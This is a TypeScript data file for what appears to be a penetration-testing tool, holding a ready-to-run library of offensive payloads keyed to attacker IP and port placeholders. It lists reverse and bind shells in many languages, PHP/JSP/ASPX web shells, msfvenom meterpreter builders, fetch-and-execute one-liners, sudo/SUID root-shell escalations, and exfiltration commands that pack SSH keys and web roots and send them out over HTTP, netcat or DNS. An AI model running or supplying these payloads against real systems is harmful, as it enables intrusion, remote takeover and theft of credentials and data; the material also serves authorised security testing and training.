/**
 * Payloads & Shells library — the artifacts operators reach for constantly,
 * curated and categorized. Placeholders (<YOUR-IP>, <LPORT>) are filled live by
 * the Variable Console, so every shell copies ready to run with your values.
 *
 * This is structured content (the model for the coming library hubs): adding a
 * payload is a data entry, not a code change.
 */
export interface Payload { title: string; lang: string; code: string; note?: string }
export interface PayloadCategory { id: string; title: string; blurb: string; payloads: Payload[] }

export const PAYLOAD_CATEGORIES: PayloadCategory[] = [
  {
    id: 'reverse-shells',
    title: 'Reverse Shells',
    blurb: 'Call back to your listener. Start a listener first (see Listeners below).',
    payloads: [
      { title: 'Bash TCP', lang: 'bash', code: 'bash -i >& /dev/tcp/<YOUR-IP>/<LPORT> 0>&1' },
      { title: 'Bash (when >& is filtered)', lang: 'bash', code: "bash -c 'exec bash -i &>/dev/tcp/<YOUR-IP>/<LPORT> <&1'" },
      { title: 'Python3', lang: 'python', code: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR-IP>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")\'' },
      { title: 'PHP', lang: 'php', code: 'php -r \'$sock=fsockopen("<YOUR-IP>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");\'' },
      { title: 'Netcat (-e available)', lang: 'bash', code: 'nc <YOUR-IP> <LPORT> -e /bin/bash' },
      { title: 'Netcat (mkfifo, no -e)', lang: 'bash', code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR-IP> <LPORT> >/tmp/f' },
      { title: 'Perl', lang: 'perl', code: 'perl -e \'use Socket;$i="<YOUR-IP>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
      { title: 'Ruby', lang: 'ruby', code: 'ruby -rsocket -e\'f=TCPSocket.open("<YOUR-IP>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'' },
      { title: 'socat (best TTY)', lang: 'bash', code: "socat TCP:<YOUR-IP>:<LPORT> EXEC:'bash -li',pty,stderr,setsid,sigint,sane" },
      { title: 'PowerShell', lang: 'powershell', code: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'<YOUR-IP>\',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
    ],
  },
  {
    id: 'web-shells',
    title: 'Web Shells',
    blurb: 'Drop on a target that serves the language. Reach cmd via ?cmd= in the URL.',
    payloads: [
      { title: 'PHP one-liner (GET)', lang: 'php', code: "<?php system($_GET['cmd']); ?>" },
      { title: 'PHP (REQUEST, formatted)', lang: 'php', code: "<?php if(isset($_REQUEST['cmd'])){echo '<pre>';system($_REQUEST['cmd']);echo '</pre>';} ?>" },
      { title: 'PHP passthru', lang: 'php', code: "<?php passthru($_GET['cmd']); ?>" },
      { title: 'JSP', lang: 'jsp', code: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
      { title: 'ASPX', lang: 'aspx', code: '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>' },
    ],
  },
  {
    id: 'bind-shells',
    title: 'Bind Shells',
    blurb: 'Target listens; you connect in. Use when you cannot get a callback out.',
    payloads: [
      { title: 'Netcat bind (-e)', lang: 'bash', code: 'nc -lvnp <LPORT> -e /bin/bash' },
      { title: 'Netcat bind (mkfifo)', lang: 'bash', code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp <LPORT> >/tmp/f' },
      { title: 'Python3 bind', lang: 'python', code: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",<LPORT>));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")\'' },
      { title: 'Connect in (attacker)', lang: 'bash', code: 'nc <TARGET-IP> <LPORT>' },
    ],
  },
  {
    id: 'listeners',
    title: 'Listeners & Shell Upgrades',
    blurb: 'Catch the shell, then upgrade it to a full interactive TTY.',
    payloads: [
      { title: 'Netcat listener', lang: 'bash', code: 'nc -lvnp <LPORT>' },
      { title: 'Listener with history (rlwrap)', lang: 'bash', code: 'rlwrap nc -lvnp <LPORT>' },
      { title: 'socat listener (full TTY)', lang: 'bash', code: 'socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>' },
      { title: 'Upgrade: spawn a PTY (victim)', lang: 'bash', code: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", note: 'Then Ctrl+Z to background.' },
      { title: 'Upgrade: fix the terminal (attacker)', lang: 'bash', code: 'stty raw -echo; fg', note: 'Then on victim: export TERM=xterm; stty rows 38 cols 116' },
    ],
  },
  {
    id: 'msfvenom',
    title: 'MSFVenom Builders',
    blurb: 'Generate staged/stageless payloads. Catch with a matching handler.',
    payloads: [
      { title: 'Windows meterpreter (exe)', lang: 'bash', code: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR-IP> LPORT=<LPORT> -f exe -o shell.exe' },
      { title: 'Linux meterpreter (elf)', lang: 'bash', code: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR-IP> LPORT=<LPORT> -f elf -o shell.elf' },
      { title: 'PHP reverse (raw)', lang: 'bash', code: 'msfvenom -p php/reverse_php LHOST=<YOUR-IP> LPORT=<LPORT> -o shell.php' },
      { title: 'Windows stageless (dll)', lang: 'bash', code: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=<LPORT> -f dll -o shell.dll' },
      { title: 'War (Java/Tomcat)', lang: 'bash', code: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR-IP> LPORT=<LPORT> -f war -o shell.war' },
    ],
  },
  {
    id: 'file-transfer',
    title: 'File Transfer',
    blurb: 'Move tools onto the target and loot back off it. Start a server on your box first (python3 -m http.server 80) and put your tools in that folder.',
    payloads: [
      { title: 'HTTP server (your box)', lang: 'bash', code: 'python3 -m http.server 80', note: 'Run it in the folder holding your tools; everything below pulls from it.' },
      { title: 'Linux wget', lang: 'bash', code: 'wget http://<YOUR-IP>/linpeas.sh -O /tmp/linpeas.sh' },
      { title: 'Linux curl', lang: 'bash', code: 'curl http://<YOUR-IP>/tool -o /tmp/tool' },
      { title: 'Linux in-memory (no disk write)', lang: 'bash', code: 'curl http://<YOUR-IP>/linpeas.sh | sh' },
      { title: 'Windows PowerShell download', lang: 'powershell', code: 'powershell -c "IWR http://<YOUR-IP>/tool.exe -OutFile C:\\Windows\\Temp\\tool.exe"' },
      { title: 'Windows PowerShell in-memory', lang: 'powershell', code: 'powershell -c "IEX(IWR http://<YOUR-IP>/script.ps1 -UseBasicParsing)"' },
      { title: 'Windows certutil', lang: 'cmd', code: 'certutil -urlcache -split -f http://<YOUR-IP>/tool.exe tool.exe' },
      { title: 'SMB server (your box)', lang: 'bash', code: 'impacket-smbserver share $(pwd) -smb2support', note: 'On Windows: copy \\\\<YOUR-IP>\\share\\tool.exe .' },
      { title: 'Netcat transfer', lang: 'bash', code: 'nc -lvnp <LPORT> < tool', note: 'On the target: nc <YOUR-IP> <LPORT> > tool' },
      { title: 'Base64 paste (no network)', lang: 'bash', code: 'base64 -w0 tool', note: 'On the target: echo <BASE64> | base64 -d > tool && chmod +x tool' },
    ],
  },
  {
    id: 'privesc-gtfobins',
    title: 'Privilege Escalation (GTFOBins)',
    blurb: 'When a binary is SUID or you can run it with sudo, these spawn a root shell. Check every binary from sudo -l and find -perm -4000 against gtfobins.github.io.',
    payloads: [
      { title: 'find (SUID)', lang: 'bash', code: 'find . -exec /bin/sh -p \\; -quit', note: 'The -p keeps the elevated privileges.' },
      { title: 'find (sudo)', lang: 'bash', code: 'sudo find . -exec /bin/sh \\; -quit' },
      { title: 'bash (SUID)', lang: 'bash', code: 'bash -p' },
      { title: 'vim (sudo)', lang: 'bash', code: "sudo vim -c ':!/bin/sh'" },
      { title: 'awk (sudo)', lang: 'bash', code: 'sudo awk \'BEGIN {system("/bin/sh")}\'' },
      { title: 'python (sudo)', lang: 'bash', code: 'sudo python3 -c \'import os; os.system("/bin/sh")\'' },
      { title: 'perl (sudo)', lang: 'bash', code: "sudo perl -e 'exec \"/bin/sh\";'" },
      { title: 'less (sudo)', lang: 'bash', code: 'sudo less /etc/profile', note: 'Then at the pager type: !/bin/sh' },
      { title: 'tar (sudo)', lang: 'bash', code: 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' },
      { title: 'env (sudo)', lang: 'bash', code: 'sudo env /bin/sh' },
    ],
  },
  {
    id: 'shell-upgrade',
    title: 'Shell Upgrade & Stabilization',
    blurb: 'Turn a dumb reverse shell into a full interactive TTY (arrow keys, tab-complete, Ctrl+C without dying). Run these in order right after you catch the shell.',
    payloads: [
      { title: '1. Spawn a PTY (Python)', lang: 'bash', code: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'', note: 'No python? try: script -qc /bin/bash /dev/null' },
      { title: '2. Set the terminal type', lang: 'bash', code: 'export TERM=xterm', note: 'Then press Ctrl+Z to background the shell.' },
      { title: '3. Fix your terminal (attacker)', lang: 'bash', code: 'stty raw -echo; fg', note: 'Press Enter twice after running this.' },
      { title: '4. Match your window size', lang: 'bash', code: 'stty rows 38 cols 116', note: 'Use your real size from: stty size' },
      { title: 'socat full TTY (best, if present)', lang: 'bash', code: 'socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>', note: 'Victim: socat tcp:<YOUR-IP>:<LPORT> exec:"bash -li",pty,stderr,setsid,sigint,sane' },
      { title: 'rlwrap listener (arrows + history)', lang: 'bash', code: 'rlwrap nc -lvnp <LPORT>' },
    ],
  },
  {
    id: 'data-exfil',
    title: 'Data Exfiltration',
    blurb: 'Get loot off the target. On locked-down networks prefer channels that blend in (HTTP / DNS) over raw outbound connections. Stage and compress first.',
    payloads: [
      { title: 'Stage + compress first', lang: 'bash', code: 'tar czf /tmp/loot.tar.gz /var/www /home/*/.ssh 2>/dev/null', note: 'Collect, compress, then exfil the single archive.' },
      { title: 'HTTP POST (curl)', lang: 'bash', code: 'curl -X POST --data-binary @/tmp/loot.tar.gz http://<YOUR-IP>/x', note: 'Catch it: nc -lvnp 80  (or a small HTTP upload handler)' },
      { title: 'Netcat', lang: 'bash', code: 'nc <YOUR-IP> <LPORT> < /tmp/loot.tar.gz', note: 'Your box: nc -lvnp <LPORT> > loot.tar.gz' },
      { title: 'Base64 (no network)', lang: 'bash', code: 'base64 -w0 /tmp/loot.tar.gz', note: 'On your box: echo <BASE64> | base64 -d > loot.tar.gz' },
      { title: 'DNS exfil (chunked)', lang: 'bash', code: 'xxd -p -c 16 secret | while read c; do dig $c.<YOUR-DOMAIN> +short; done', note: 'Capture on your authoritative DNS / interactsh.' },
    ],
  },
];
